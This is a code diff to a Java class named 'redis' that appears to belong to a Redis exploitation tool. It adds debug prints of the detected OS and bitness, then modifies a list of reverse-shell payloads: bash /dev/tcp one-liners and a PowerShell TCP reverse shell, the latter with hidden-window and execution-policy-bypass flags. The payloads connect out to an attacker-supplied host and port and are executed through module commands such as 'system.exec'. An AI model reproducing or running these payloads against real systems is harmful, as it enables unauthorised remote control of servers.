@@ -97,7 +97,8 @@ public class redis {
         try {
             String osKey = detectOSKeyFromRedis();
             String bits = detectBitsFromRedis();
-
+            System.out.println(osKey);
+            System.out.println(bits);
             String resourceDir = "/redis/" + osKey + "/" + bits + "/";
             String expectedName;
             switch (osKey) {
@@ -765,7 +766,7 @@ public class redis {
         List<String> cmds = new ArrayList<>();
         cmds.add("bash -c 'bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1'");
         cmds.add("/bin/bash -c 'bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1'");
-        cmds.add("powershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('" + host + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\"");
+        cmds.add("powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('" + host + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\"");
 
         for (String c : cmds) {
             String[] candidates = {"system.exec", "sys.exec", "exec"};
